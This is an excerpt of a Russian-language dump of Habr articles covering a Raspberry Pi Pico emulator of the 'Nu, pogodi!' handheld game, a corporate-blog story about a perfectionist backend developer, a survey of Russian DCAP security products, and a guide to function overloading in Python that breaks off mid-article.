 dma_channel_config c2 = dma_channel_get_default_config(dma_chan2);   channel_config_set_transfer_data_size(&c2, DMA_SIZE_8);   channel_config_set_read_increment(&c2, true);   channel_config_set_write_increment(&c2, false);   channel_config_set_dreq(&c2, DREQ_PIO0_TX0);   channel_config_set_ring(&c2, false, 8);   channel_config_set_chain_to(&c2, dma_chan1);   dma_channel_set_irq0_enabled(dma_chan2, true);   dma_channel_configure(dma_chan2, &c2, &pio0_hw->txf[0], buffer2,                         SOUND_BUFFER_SIZE, false);    // Configure the processor to run dma_handler() when DMA IRQ 0 is asserted   irq_set_exclusive_handler(DMA_IRQ_0, dma_handler);   irq_set_enabled(DMA_IRQ_0, true);   dma_channel_start(dma_chan1); }     Программа для PIO State Machine .pio_version 0  .program beeper_tx  .wrap_target out pins, 1 [7] .wrap  % c-sdk { #include ""hardware/clocks.h""  static inline void beeper_tx_program_init(PIO pio, uint sm, uint offset, uint pin_tx, uint baud) {      pio_gpio_init(pio, pin_tx);      pio_sm_config c = beeper_tx_program_get_default_config(offset);      pio_sm_set_consecutive_pindirs(pio, sm, pin_tx, 1, true);      sm_config_set_out_shift(&c, true, true, 1);      sm_config_set_out_pins(&c, pin_tx, 1);      sm_config_set_fifo_join(&c, PIO_FIFO_JOIN_TX);      // SM transmits 1 bit per 8 execution cycles.     float div = (float)clock_get_hz(clk_sys) / (baud * 8);     sm_config_set_clkdiv(&c, div);      pio_sm_init(pio, sm, offset, &c);     pio_sm_set_enabled(pio, sm, true);  }  %}    ▍ Синхронизация эмуляции микроконтроллера, звука и изображения  Одной из задач я ставил реалистичную эмуляцию звука оригинальной «Ну, погоди!», и это мне удалось, оставалось его синхронизировать с эмуляцией дисплея и эмуляцией работы микроконтроллера. Я поступил следующим образом: так как у RP2040 два ядра, одно ядро я использовал для эмуляции дисплея, а второе для эмуляции микроконтроллера. Для обеспечения точной синхронизации и соблюдения временных интервалов воспроизведения звука я применил два звуковых буфера, используемых эмулятором микроконтроллера для обработки данных. Один буфер служит для записи звука эмулятором, в то время как из второго осуществляется воспроизведение. После завершения вывода звука из буфера воспроизведения происходит смена ролей: буфер записи становится буфером воспроизведения, и наоборот. Данные из буфера воспроизведения передаются с помощью механизма DMA в программу машины состояний PIO, которая обеспечивает высокоточное управление выводом данных на подключённый к пину пассивный зуммер. По завершении передачи всего содержимого буфера воспроизведения через DMA срабатывает обработчик прерывания. Он устанавливает флаги, необходимые для отрисовки и продолжения работы эмулятора, а также выполняет переключение буферов: буфер воспроизведения становится буфером записи, а буфер записи — буфером воспроизведения. Для непрерывного вывода содержимого буферов я использовал DMA chaining. Синхронизация оказалась самой сложной задачей. Даже после того, как я вроде бы решил задачу сихронизации, я слышал металлический звук. Сначала я подумал, что, может, у меня зуммер такой, но потом всё-таки подключил логический анализатор к выводу микроконтроллера, и увидел странности в генеририуемом звуке. Причём, если я не заполнял фреймбуфер для отображения, странности исчезали. Проблема оказалась в следующем. Микроконтроллер RP2040 не имеет встроенной памяти, а использует внешнюю флеш-память. Для ускорения доступа используется XIP-кэш. Во флеш-памяти обычно располагаются команды для микроконтроллера, но я разместил и ROM «Ну, погоди!». Поэтому программе приходилось постоянно обращаться к разным областям флеш-памяти, кэш часто оказывался невалидным, что требовало обращения к медленной флеш-памяти, и появлялись провалы в генерировании звука. Я решил проблему, разместив весь программный код в оперативной памяти и принудительно указал, что ROM игры находится во флеш-памяти. ▍ Обработка кнопок  Как вы видели на схеме, в «Ну, погоди!» все кнопки, кроме кнопки сброса, объеденены в матрицу 2x4. Так как я не был ограничен тем, как будет реализована клавиатура в моём эмуляторе, я решил сделать аналогичную клавиатуру. С целью упрощения и экономии места на плате я не стал добавлять кнопку сброса, присутствующую в оригинальной «Ну, погоди!». Для сброса достаточно просто отключить питание от Raspberry Pi Pico и повторно подключить. ▍ Устройство эмулятора  Я разрабатывал эмулятор на современных компонентах и ставил целью только создание прототипа эмулятора «Ну, погоди!». Для прототипов удобны беспаечные макетные платы. Нам понадобится:  Raspberry Pi Pico (я пользовался версией с WiFi, но должен подойти и обычный или даже китайский клон), беспаечная макетная плата, 8 тактовых кнопок без фиксации положения, кнопка с фиксацией положения (это необязательно, но позже я расскажу, зачем понадобится эта кнопка), TFT-дисплей (я использовал с драйвером ILI 9341), пассивный зуммер, резистор 100 Ом, резистор 1 кОм, транзистор 2N2222, набор соединительных проводов с Dupont-клемами, набор джамперов для беспаечных макетных плат.  Резисторы и транзисторы нужны, чтобы не спалить выход Raspberry Pi Pico и добиться приемлемой громкости звука. Компоненты, используемые для создания эмулятора  ▍ Схема эмулятора на базе Raspberry Pi Pico  Чтобы вы могли быстро повторить схему, приведу схему эмулятора, созданную в Fritzing. Схема эмулятора, созданная в Fritzing  Также для удобства привожу распиновки Raspberry Pi Pico W, TFT-дисплеев MSP2806/MSP2807 и соединения компонентов в виде таблиц.  Распиновка Raspberry Pi Pico W Распиновка дисплеев MSP2806/MSP2807 Дисплей MSP2806 отличается от MSP2807 тем, что у MSP2807 сенсорный экран, а у MSP2806 — нет. Для эмулятора нет необходимости использовать сенсорный экран. ▍ Соединение Raspberry Pi Pico и MSP2806     Raspberry Pi Pico  MSP2806    PIN21 GP16 (SPI0 RX)  SDO(MISO)    PIN36 3V3(OUT)  LED    PIN24 GP18 (SPI0 SCK)  SCK    PIN25 GP19 (SPI0 TX)  SDI(MOSI)    PIN26 GP20  DC    PIN27 GP21  RESET    PIN22 GP17 (SPI0 CSn)  CS    PIN23 GND  GND    PIN36 3V3(OUT)  VCC     ▍ Соединение Raspberry Pi Pico и кнопок     Raspberry Pi Pico  Кнопки    PIN9 GP6  Будильник, Игра А, Игра Б, Время    PIN10 GP7  ↖️, ↙️, ↘️, ↗️    PIN14 GP10  ↖️, Будильник    PIN15 GP11  ↙️, Игра А    PIN16 GP12  ↗️, Игра Б    PIN17 GP13  ↘️, Время    PIN11 GP8  Кнопка вечных жизней    PIN36 3V3(OUT)  Кнопка вечных жизней     ▍ Соединение Raspberry Pi Pico и модуля зуммера     Raspberry Pi Pico  Модуль зуммера    PIN36 3V3(OUT)  VCC    PIN18 GND  GND    PIN20 GP15  I/O     У меня не было готового модуля зуммера, поэтому я реализовал его на выводных компонентах, которые у меня были. Ниже приведена его схема. Резистор в 100 Ом используется для уменьшения громкости звука. Схема модуля зуммера  ▍ Исходный код  Я упростил и адаптировал существующий код из нескольких проектов на Github, портировав его на эмулятор, который я собрал на базе Raspberry Pi Pico. Я сделал код чище и понятнее, чтобы вы могли сконцентрироваться на сути и не заблудиться в деталях. Исходный код моего эмулятора вы можете посмотреть на Github. ▍ Сборка и запуск эмулятора  Если вы хотите собрать мой проект, то нужно выполнить следующие шаги в Linux (Ubuntu):  Устанавливаем зависимости $ sudo apt install cmake python3 build-essential gcc-arm-none-eabi libnewlib-arm-none-eabi libstdc++-arm-none-eabi-newlib  Переходим в рабочую директорию $ cd ~ $ mkdir emulator && cd emulator  Клонируем Pico SDK $ git clone https://github.com/raspberrypi/pico-sdk $ cd pico-sdk $ git submodule update --init --recursive  Клонируем репозиторий с моим эмулятором $ cd .. $ git clone git@github.com:artyomsoft/pico-nu-pogodi.git $ cd pico-nu-pogodi git submodule update --init --recursive  Собираем эмулятор export PICO_SDK_PATH=$(pwd)/../pico-sdk mkdir -p build cd build cmake .. -DPICO_COPY_TO_RAM=1 make  Подключаем Raspberry Pi Pico в режиме загрузки и копируем на него файл pico_nupogodi.uf2  Если у вас не установлен Linux, а посмотреть работу эмулятора хочется, можете скачать уже собранный эмулятор со страницы релизов и записать его в Raspberry Pi Pico. ▍ Вечные жизни  Ну и бонусом я расскажу, зачем мы добавили дополнительную кнопку с фиксацией положения. Дело в том, что в «Ну погоди!», вероятно, в целях отладки, предусмотрена возможность отключить подсчёт штрафных очков. Для того чтобы подсчёт не вёлся, необходимо подавать логическую единицу на вход первого прерывания. Так как у нас полностью эмулируется работа микроконтроллера, сделать вечные жизни проще простого — передать состояние кнопки на регистр прерывания. Благодаря этой кнопке я проверил миф о мультфильме при достижении 1000 очков на практике — мультфильма не было, чего, конечно, и следовало ожидать. Живой пример с работой эмулятора «Ну, погоди!»  Внешний вид эмулятора приведён ниже. Несмотря на большое количество проводов, они практически не мешают увлекательной игре. Может, в дальнейшем я соберу его на печатной плате. Но на данный момент моё любопытство было удовлетворено, я получил работающий прототип и насладился игрой. Внешний вид эмулятора  Эмулятор получился очень реалистичный, эмулируется поведение оригинального устройства очень хорошо. Чтобы убедиться в моём утверждении, посмотрите видео, показывающее работу эмулятора в сравнении с моей оригинальной игрой, у которой немного потёк экран. Полезные ссылки   Репозиторий с моим эмулятором Mame Примеры кода для Raspberry Pi Pico Raspberry Pi Pico SDK Raspberry Pi Pico Examples Raspberry Pi Pico Playground Raspberry Pi Pico на МК RP2040: начало и первые шаги. Что есть поесть за $4 Cамоучитель по Pico Генерация заголовочного файла из бинарного Тема форума по эмулятору «Ну, погоди!» Отладчик для «Ну, погоди!» и других игр Список игр Game and Watch Статья по КБ1013ВК1-2 Работа с LCD на базе 9341ili Микропроцессорные средства и системы  Заключение  Удивляет и вызывает восхищение, как раньше программисты умудрялись разрабатывать игры при таких ограниченных ресурсах. В 1856 байт уместить полноценную игру, не утратившую свою актуальность и увлекательность в наше время. Разбираясь с созданием эмулятора, я лучше ознакомился с современным микроконтроллером Raspberry Pi Pico, узнал много фактов, которые уже давно стали историей, получил навыки работы с программой Fritzing, ставшей де-факто основной программой для документирования электронных схем для DIY Pet проектов. Надеюсь, и вы узнали что-нибудь интересное для себя из статьи, а если вы проявили больший интерес, и хватило терпения собрать эмулятор «Ну, погоди!», то и насладились реалистичностью эмуляции. Эмулятор не заменит обладание оригинальной игрой, так как она уже стала артефактом истории (я не учитываю современные новоделы). Но поверьте, создание эмулятора — процесс не менее увлекательный, чем сама игра. Я не включил в статью много интересностей, с которыми столкнулся при написании эмулятора, их вы можете найти в разделе «Полезные ссылки». Мой эмулятор обладает рядом преимуществ:  эмулятор достаточно просто будет адаптировать для эмуляции других игр серии, режим без подсчёта штрафных очков работает сразу из коробки, используемые тактовые кнопки вместо мембранных тактильно ощущаются приятнее .  Но главное — я, и, надеюсь, вы тоже, получили удовольствие от кратковременного возвращения в беззаботное детство, в котором игра «Ну, погоди!» была одним из немногих электронных развлечений, доступных большинству. © 2025 ООО «МТ ФИНАНС»  Telegram-канал со скидками, розыгрышами призов и новостями IT 💻"
90,Перфекционист? Готовься остаться без работы,Minervasoft,Платформа управления знаниями для команд и GenAI,0,"Программное обеспечение, Поисковые технологии, Веб-сервисы",2025-04-09,"Уже 8 лет я — бэкенд-разработчик. Последние три года работаю в продуктовой компании, где до недавнего времени все ценили мой подход к работе: архитектура, чистый код и продуманная система всегда стояли на первом месте. Если что-то делали, то делали хорошо, чтобы потом не переделывать. Меня часто спрашивали о технических решениях, новички приходили за советом, а менеджеры уточняли реалистичность сроков. В общем, комфортная и понятная среда.Да, иногда я становился тем самым душнилой, который на каждом собрании говорил о правильной архитектуре, паттернах проектирования и важности чистого кода. И команда это принимала. Потому что все работало стабильно.Но эта история не о моих звёздных временах. Она о том, как наша компания переключилась с философии «хорошо с первого раза», до «кодим как можем, фиксим на проде», и как я  ̶с̶ ̶э̶т̶о̶г̶о̶ ̶о̶ф̶и̶г̶е̶в̶а̶л̶  к этому привыкал. Дисклеймер: статья написана специально для блога Minervasoft на основе работы с источниками и личного опыта автора. Новый CTO и его философия «делаем как получится»В компании сменилось руководство. Новый технический директор пришёл из какого-то стартапа в Сколково, который недавно привлёк инвестиции. На первой презентации он рассказывал про agile, про то, как важно быстро выпускать продукт на рынок и итерироваться. Ничего такого, с чем я бы в принципе спорил.Но вот дальше стало интереснее. Оказалось, что «быстрые итерации» на его языке означают «делаем как получится, а потом будем фиксить». А моя любовь к продуманной архитектуре стала называться «избыточным перфекционизмом» и… бюрократией…Впервые ситуация стала меняться на совещании о разработке нового платёжного модуля. Я предложил наш обычный подход: сначала документация, детальное проектирование API и архитектуры. Новый CTO назвал эти этапы пустой тратой времени и потребовал немедленно начать писать код.Я напомнил про технический долг, но в ответ услышал что-то вроде «разберёмся потом». Всё происходящее казалось сном или какой-то параллельной реальностью. Моё сознание активно сопротивлялось происходящему — классический этап отрицания, как в учебнике по психологии. Новые приоритетыСледующие несколько месяцев я наблюдал, как меняются приоритеты. Запланированный рефакторинг отложили. Код-ревью стали поверхностными — «лишь бы работало». А мои комментарии про такой формат работы начали вызывать нескрываемое раздражение у начальства.Кульминацией стало обсуждение выбора фреймворка для нового микросервиса. Я настаивал на Django — проверенном, с большой экосистемой, позволяющем быстро и безопасно создавать сложные системы. Считал, что с Django у нас будет меньше багов и быстрее разработка в долгосрочной перспективе.Новый CTO продвигал Flask. По его мнению, это простой и понятный фреймворк, ничего лишнего. С ним можно быстрее освоиться и быстрее сделать MVP.В итоге выбрали Flask, хотя это означало, что многие вещи нам придётся реализовывать с нуля — авторизацию, ORM-настройки, админку. Когда я подсчитал, что в итоге мы потратим больше часов, меня уже никто не слушал. Важной стала скорость получения первых результатов, а не общая эффективность.Я сидел и думал — когда именно я превратился из уважаемого специалиста в динозавра, тормозящего «гибкие бизнес-процессы»?Новые KPI Изначально я был не единственным, кому было сложно принять новое положение вещей. Мои коллеги тоже испытывали трудности: фронтендеры жаловались на кучу багов из-за спешки, QA — на поток тестирования без времени на автоматизацию, а аналитики не успевали документировать изменения. Вскоре обновили KPI. Раньше мои показатели включали надёжность систем, количество инцидентов и время простоя — всё то, что мотивировало писать качественный и стабильный код. Теперь главными метриками стали:Количество закрытых задач в спринте.Скорость релизов.Процент выполненных бизнес-требований в срок.Чистый код? Документация? Архитектурные улучшения? Не, не слышали. На одном из регулярных one-to-one с CTO я попытался объяснить, почему это проблема. Привёл пример нашего платёжного сервиса, который мы полгода назад переписали с более продуманной архитектурой и с тех пор не имели ни одного серьёзного инцидента.Он ответил, что сейчас компания находится в совсем другой ситуации. Мы сжигаем деньги инвесторов, и если не покажем рост через полгода, никого не будет волновать, насколько элегантна наша архитектура. Я чувствовал себя точь в точь как в сериале “Консультант” с Кристофом Вальцем. Я понимал логику. Но одновременно видел, как технический долг накапливается со страшной скоростью. Начал замечать, что меня всё реже приглашают на обсуждения. Что новый разработчик, который пишет быстро, пусть и с багами, получает больше внимания и одобрения. Что мои технические знания, которыми я гордился, в новой реальности не так уж и важны. А потом меня просто не позвали на встречу, где обсуждали архитектуру модуля, над которым я работал полгода. Полгода работы, ни одного серьёзного бага — и вот так.Впервые за много лет я почувствовал, что могу потерять работу. Тогда я всерьёз задумался: либо стараюсь адаптироваться, либо за борт. За борт не хотелось. Мнение с другой стороныМне пришлось поговорить напрямую с руководством, чтобы понять их мышление. Компания серьезно меняла свою бизнес-модель, и скорость вывода продуктов на рынок стала жизненно важной. Мы общались 2 часа. Многое стало понятнее.Разработка всегда должна идти в ногу с бизнесом — это очевидно. Но главные ценности изменились: вместо стабильности и надежности стали важны скорость и гибкость. А я всё ещё работал по-старому.Я не один испытывал дискомфорт. Команда фактически разделилась на два лагеря:«Старая гвардия» — разработчики, привыкшие к качественному коду и продуманной архитектуре. Они скептически смотрели на новые подходы.«Новая волна» — недавно пришедшие и те, кто быстро адаптировался к новому стилю. Они легко принимали идею «делаем быстро, потом доработаем».Одни вечером оставались, чтобы рефакторить особенно проблемные участки кода (уже не в рамках задач, а просто потому что «так жить нельзя»). Другие штамповали фичи, не особо заботясь о завтрашнем дне.Один опытный коллега поделился со мной, что после перехода на новый формат работы количество инцидентов выросло на 20%. Но никто как будто не замечает. Когда он попытался обсудить это с CTO, тот сказал, что пока мы укладываемся в SLA, это приемлемая цена за скорость.Мой взгляд на работу постепенно менялся. Когда одна коллега спокойно писала модуль, зная, что через месяц его выкинут, я не испытывал возмущения. Она считала это нормальным, поскольку нам нужно было быстро проверить гипотезу. Окей, если так. Раньше я назвал бы это мартышкиным трудом. Пять приёмов, которые помогли мне адаптироватьсяСначала было тяжело. Я привык делать хорошо, а не быстро. Я считал, что качество важнее сроков. Но, судя по всему, такой подход крайне устарел в наших реалиях. Я пробовал работать по-другому. Вместо того чтобы сразу предлагать продуманное идеальное решение, я начал с минимально работающей версии, а потом постепенно её улучшал. Это было непривычно и, честно говоря, больно для моего перфекционистского сердца. Но так действительно получается быстрее. А ещё я стал вести список технического долга — чтобы не забыть вернуться к проблемным местам, когда появится время.Вот несколько приёмов, которые мне помогли:Техдолг как проект. Я создал Jira-доску с техническим долгом, оценил каждый пункт и привязал его к конкретным бизнес-рискам. Например: «Отсутствие тестов в платёжной системе —> риск финансовых потерь и репутационного ущерба при сбоях». Всё стало визуализировано, а не просто жило в моей многострадальной голове. Тактика малых побед. Вместо того чтобы предлагать недельный рефакторинг, я стал выделять маленькие улучшения, которые можно внедрить за 2-3 часа.Разговор на языке бизнеса. Я пересмотрел свою коммуникацию. Разговоры на «языке бизнеса» всегда вызывали у меня какое-то непреодолимое жжение в определенной области. Но сейчас я понимаю, насколько важно уметь общаться и договариваться с руководством на их языке. Вместо «нам нужна вот такая архитектура» я стал говорить «это ускорит внедрение фич в будущем и снизит количество багов на X%». Компромиссы с измеримой выгодой. Я научился идти на компромиссы, но с чётким пониманием, что мы получаем взамен. «Хорошо, мы можем сейчас сделать быстрое решение, это сэкономит нам 3 дня. Но давайте запланируем 1 день через две недели на рефакторинг, иначе мы потеряем эту экономию на сопровождении».Работа с новыми инструментами. Я стал активнее использовать корпоративные инструменты и нашу базу знаний Minervasoft. Осторожно, реклама! Это корпоративный блог. Мы сделали его, чтобы о Minervasoft узнало больше людей.Мы показываем продукт в каждой статье — это цель блога. Без этого контента бы не было.Мы понимаем, что рекламные вставки раздражают, особенно когда они «нативные». Поэтому предупреждаем: дальше герой расскажет, зачем ему понадобилась база знаний и как Minervasoft помогла решить его проблему. Спасибо, что читаете.Когда новый СТО настоял на внедрении Minerva Knowledge, я был из тех, кто отнёсся к этому с прохладцей – еще одна система, в которой надо копаться. Но со временем мои коллеги начали меньше обращаться ко мне с вопросами и как-то больше самостоятельно вникать в процессы. Моя личка буквально пустовала. Я решил дать шанс базе, и она действительно оказалось удобна. Раньше я думал, что корпоративные базы — как бабушкин сундук: вроде все есть, но найти невозможно. А тут поиск работает отлично, на уровне Яндекса. Когда я печатаю с ошибками или забываю переключить раскладку (ghbdtn), система всё равно находит нужные документы.Особенно зашла функция с Wiki-структурой. Я организовал все наши архитектурные решения по модулям, и теперь, когда какой-нибудь джун спрашивает почему мы используем тот или иной паттерн, я просто кидаю ссылку вместо получасовой лекции.Недавно попробовал пошаговые сценарии. Я создал инструкцию диагностики проблем в нашем платёжном API. Если кому-то из команды понадобится, зайдут и посмотрят. Удобно, что всё в одной системе — не нужно скакать между Миро, Джирой и другими сервисами.Постепенно лёд начал таять. Новый CTO одобрил моё предложение по рефакторингу одного из модулей — правда, только после того, как я объяснил, как это ускорит внедрение нового функционала, который очень ждал бизнес.Попробовать продукты MinervasoftПервые признаки успехаПереломный момент наступил, когда мы столкнулись с серьёзной проблемой в продакшене. Быстро созданный платёжный сервис начал дублировать транзакции в определённых сценариях — классическая проблема с race condition.Команда билась над проблемой два дня без результата. В конце концов, CTO попросил меня взглянуть.Я провёл вечер, анализируя код и системную архитектуру. Бардак. На утро представил не только решение, но и детальную схему того, как правильно организовать процесс обработки платежей с учётом всех краевых случаев.CTO был впечатлён и спросил, сколько времени нужно на внедрение. Я ответил, что два дня на исправление текущей проблемы и ещё неделя, чтобы перестроить архитектуру и избежать подобных проблем в будущем.К моему удивлению, он согласился на полное решение. А через неделю, когда мы успешно всё внедрили, он сам спросил, какие ещё системы требуют доработки.Три важных урока, которые я извлёк из этого опытаТехнический перфекционизм — это сильное преимущество, но нужно смотреть на реальные задачи компании. Новый подход к работе уже не кажется таким ужасным, и я наконец-то снова кайфую от своей работы. Да и зарплата выросла благодаря развитию компании. Мелочь, а приятно:)Адаптация — это не предательство своих принципов. Я просто добавил новые инструменты в свой арсенал. Конечно, я до сих пор ценю хорошую архитектуру и чистый код. Но теперь понимаю, что иногда быстрое и работающее решение лучше, чем идеальное, но опоздавшее к рынку.И самое главное — я понял, что моя ценность как разработчика заключается не только в технических знаниях, но и в умении применять их в правильном контексте. Не в вакууме идеального мира разработки, а в реальности, где бизнес-потребности постоянно меняются.Звучит как довольно простая мысль. Но поверьте, когда годами работаешь в одной парадигме, понять и принять новую — чертовски сложно. Несколько месяцев спустяЯ всё ещё работаю в той же компании. У меня меньше контроля, но, возможно, больше влияния — через обучение команды и поддержку правильного баланса между скоростью и качеством.Иногда я скучаю по тем временам, когда мог неспешно продумывать архитектуру до мелочей. Но надо признать, что новый подход научил меня многому. И, может быть, сделал разработчиком лучше — хотя и не таким, каким я представлял себя раньше.Недавно, когда мы запускали новый сервис, CTO сам предложил выделить доп время на проектирование одного модуля — мол, он слишком критичен для быстрых решений. Видимо, где-то мы нашли правильный баланс, хоть и спустя время.У Minervasoft есть свой блог в Telegram — там будут выходить другие статьи про спорные вопросы в найме, менеджменте и планировании. Подпишитесь, чтобы не пропустить."
91,Ставка на отечественное: ИБ-специалисты оценили российские DCAP-системы,SearchInform,Разработчик ПО для защиты информации,0,"Программное обеспечение, Информационная безопасность",2025-04-09,"DCAP входят в число базовых ИБ-инструментов. Почти каждый российский вендор включил систему файлового аудита в свою линейку продуктов. Однако «эталонный» функционал для российских систем еще формируется. Мы опросили более 100 ИБ-специалистов и узнали, какие возможности DCAP-систем востребованы среди заказчиков и как они оценивают решения, представленные на российском рынке. Обо всем под катом (с красотой и графиками).Отечественные DCAP-системыВ 2022 году заказчикам пришлось искать замену иностранным решениям, которые ушли с отечественного ИТ- и ИБ-рынка. DCAP-системы не стали исключением. В рамках опроса ИБ-специалисты ответили, уступают ли отечественные системы иностранным. 63% считают, что российские DCAP ничем не хуже иностранных. Почти каждый четвертый респондент ответил, что российские DCAP функционально превосходят зарубежные аналоги. «Российский рынок DCAP относительно молод. Несмотря на это, представленные системы не просто конкурентоспособны, но и функционально превосходят иностранные аналоги. Российские DCAP кастомизируются под отечественную инфраструктуру, задачи и локализацию детектирования именно наших видов конфиденциальных данных. Также многие решения идут по пути расширения функционала с аудита до проактивной защиты данных, которая недоступна в зарубежных решениях», – отмечает Алексей Парфентьев, заместитель генерального директора по инновационной деятельности «СёрчИнформ».Использование DCAP-систем22% опрошенных компаний ответили, что уже используют DCAP-систему, 13% – заняты внедрением. Больше половины (56%) респондентов планируют в будущем использовать DCAP. Больше половины (55%) опрошенных компаний внедряют DCAP-систему одного вендора после первого теста. 36% – перед внедрением тестируют 2-3 продукта разных вендоров. 9% – ответили, что протестировали 4 и более системы, прежде чем принять решение о покупке. Также мы спросили, какие задачи решает DCAP-система в российских компаниях. Топ-3 задачи: защита от утечек и неправомерного доступа (73%), аудит обработки конфиденциальных данных (68%), помощь в расследовании инцидентов (67%). Каждая вторая компания использует DCAP для оптимизации файловых хранилищ.*Защита данных Для большинства опрошенных задача защиты конфиденциальных данных стоит очень остро. 58% присвоили задаче 4 и 5 баллов по пятибалльной шкале.ИБ-специалисты ответили, с помощью каких альтернативных инструментов обеспечивают защиту конфиденциальных данных. 80% – используют встроенные возможности системных средств (в ОС, AD, СУБД и т.д.), 61% – используют встроенные возможности прикладных средств (в 1C, CRM и т.д.), 17% – используют различные СЗИ.*У тех, кто использует другие СЗИ, чаще всего в ответах встречались следующие системы: DLP, IDM и NGFW.Будущее DCAP-системВ рамках опроса ИБ-специалисты высказались о перспективах развития рынка DCAP и ответили на вопрос о том, чего ожидают от функционала систем. Больше половины (56%) считают, что современным системам не хватает аналитического функционала. 53% хотели бы видеть в современных DCAP проактивный функционал. 49% ответили, что современным DCAP не хватает интеграции с другим ПО.*«DCAP – это перспективное направление СЗИ, поэтому российские разработчики будут активно развивать функционал своих решений. Одни вендоры будут адаптировать свои DCAP под массовый рынок и пользовательский сегмент, чтобы занять место, например, среди антивирусов. Другие будут подстраиваться под крупный энтерпрайз, т. е. расширять DCAP как архитектурно, так и функционально. В ближайшие годы мы, возможно, увидим тенденцию на развитие DCAP как одного из основных СЗИ для защиты конфиденциальной информации», – отмечает Алексей Парфентьев, заместитель генерального директора по инновационной деятельности «СёрчИнформ».* – вопросы с возможностью выбрать несколько вариантов ответов."
92,Гайд по overload: как написать один код на Python для разных бэкендов,билайн,Компания,0,Связь и телекоммуникации,2025-04-09,"Разработчики часто сталкиваются с задачами, в которых одна функция должна работать с разными типами данных и количеством аргументов. Чтобы каждый раз не создавать множество функций с разными именами, существует перегрузка (overload). Она позволяет использовать одно имя операции для обработки различных комбинаций входных данных. Благодаря перегрузке одна функция может адаптироваться под различные сценарии и делать код лаконичным и понятным. В статье разберемся, как работает перегрузка в статических и динамических языках программирования. В конце покажу, как и зачем мы реализовали перегрузку на Python своим собственным способом.Что такое перегрузка функцийПерегрузка функций (function overloading) — это концепция, которая позволяет определять несколько функций или методов с одинаковым именем, но с разными сигнатурами: количеством, типами или порядком аргументов. Компилятор или интерпретатор выбирает подходящую версию функции на основе переданных аргументов. Это используется в строго типизированных языках, чтобы писать гибкий и читаемый код было проще.Примеры перегрузки в C++ и TypescriptC++ — классический пример языка с поддержкой перегрузки «из коробки». У нас есть две функции с одинаковым названием sum, но с разным типом параметров — int и double:#include <iostream> #include <string>  int sum(int a, int b) {     return a + b; }  double sum(double a, double b) {     return a + b; }  int main() {     std::cout << sum(2, 3) << std::endl;     // Вызовет sum(int, int)     std::cout << sum(2.5, 3.1) << std::endl; // Вызовет sum(double, double)     return 0; }В TypeScript перегрузка функций реализуется на уровне типов. Здесь две сигнатуры объявлены как перегрузка функции greet, а сама реализация одна. Она проверяет, какие аргументы пришли:function greet(name: string): string; function greet(name: string, age: number): string; function greet(name: string, age?: number): string {   if (age !== undefined) {     return `Hello, ${name}! You are ${age} years old.`;   } else {     return `Hello, ${name}!`;   } }  console.log(greet(""Alice""));       // ""Hello, Alice!"" console.log(greet(""Bob"", 30));     // ""Hello, Bob! You are 30 years old."" Почему перегрузки в чистом виде нет в Python и других динамических языках?Python — язык с динамической типизацией. Во время исполнения любая переменная может содержать объект почти любого типа. Получается, что единственная «актуальная» сигнатура функции видна только в рантайме. Если сделать в Python две функции с одинаковым именем, то последняя «затрет» предыдущую:def hello(name: str):     print(f""Hello {name}"")  def hello(age: int):     print(f""Your age is {age}"")  hello(""Alice"")  # ""Your age is Alice"" – ошибка: вызовется вторая версия, но она ждёт int.По умолчанию никакого отдельного механизма перегрузки в Python нет. Но это не значит, что перегрузка невозможно в принципе (:Как же создать перегрузку в Python?Ниже опишу подходы, которые часто используются в реальном Python-коде. Первый — самый популярный, остальные — максимально простые в реализации.1. Проверка типов внутри функции:def hello(name_or_age):     if isinstance(name_or_age, str):         print(f""Hello {name_or_age}"")     elif isinstance(name_or_age, int):         print(f""Your age is {name_or_age}"")     else:         raise TypeError(""Expected str or int"")Минус такого подхода — единая монолитная функция, которая со временем может раздуться и стать нечитаемой. А еще она не дает возможности задавать несколько версий функции с разными сигнатурами.2. Уникальные имена для каждой комбинации:Вместо перегрузки можно использовать разные имена функций для каждой комбинации аргументов.def hello_str(name):     print(f""Hello {name}"")  def hello_int(age):     print(f""Your age is {age}"")Такой метод максимально прост и прозрачен, не требует дополнительных инструментов или проверок, что делает его удобным для случаев, где важна явность. Однако это увеличивает количество функций в коде и не соответствует концепции перегрузки, так как нет единой точки входа, что может быть неудобно при работе с похожими по смыслу операциями и может сделать API библиотеки громоздким.3. Использование декоратора functools.singledispatch (доступен с Python 3.4):from functools import singledispatch  @singledispatch def hello(arg):     raise TypeError(""Unsupported type"")  @hello.register def _(arg: str):     print(f""Hello {arg}"")  @hello.register def _(arg: int):     print(f""Your age is {arg}"") Этот декоратор позволяет регистрировать функции-обработчики для разных типов аргументов. Но singledispatch ориентирован на тип первого аргумента, а для многих случаев (например, учитывая несколько параметров, Union, Optional и т. д.) этого может быть недостаточно.4. Использование библиотеки multipledispatch:from multipledispatch import dispatch  @dispatch(str) def hello(arg):     print(f""Hello {arg}"")  @dispatch(int) def hello(arg):     print(f""Your age is {arg}"")Эта библиотека позволяет регистрировать функции для разных сигнатур, но она не входит в стандартную библиотеку Python — так что придется устанавливать ее отдельно. Кроме того, она не поддерживает аннотации типов.5. Использование сторонних библиотекНестандартные библиотеки или самодельные решения, которые пытаются проанализировать типы через аннотации и хранить разные реализации одной функции в разных местах. Именно в эту категорию и попадает описанная в вопросе реализация.Как мы делаем перегрузку функций в PythonМы с командой пришли к тому, что нет такого подхода, который бы идеально нам подошел. Они:имеют ограничения по количеству аргументов, по которым перегружаютсяне умеют работать с generic'ами по типу Union, Optional, с аргументами по умолчанию, с args, **kwargs.Наше решение по перегрузке адаптировано под запросы команды, поэтому в нем можно использовать и другие наши техники: например, LazyImport. Это удобно, и коллеги довольны (:Наша реализация состоит из двух ключевых классов — OverloadManager, OverloadFunction, и декоратора @overload. Давайте разберем, как они взаимодействуют и решают сложные задачи перегрузки.Важно: Наша реализация overload — это не то же самое, что @overload из typing. Декоратор из typing используется только для статической типизации и не влияет на runtime-поведение, в то время как наша версия направлена на динамическую диспетчеризацию вызовов на основе типов и количества аргументов.  1. Регистрация функций и методов (OverloadManager.register)Когда вы применяете декоратор @overload к функции, она регистрируется в OverloadManager. Здесь происходит первый важный шаг — определение, является ли объект обычной функцией или методом класса.Отличие функции от методаМы используем атрибут __qualname__, который возвращает полное имя функции или метода. Например:Для обычной функции: __qualname__ = ""process"".Для метода класса: __qualname__ = ""MyClass.process"".Если в __qualname__ есть точка (.), это означает, что функция — метод класса. Тогда мы извлекаем имя класса и сохраняем метод в словаре self.methods с ключом (module, class_name, method_name). Для обычных функций используется просто имя в словаре self.functions.Зачем это нужно? Это позволяет различать перегрузку на уровне функций и методов, а также поддерживать 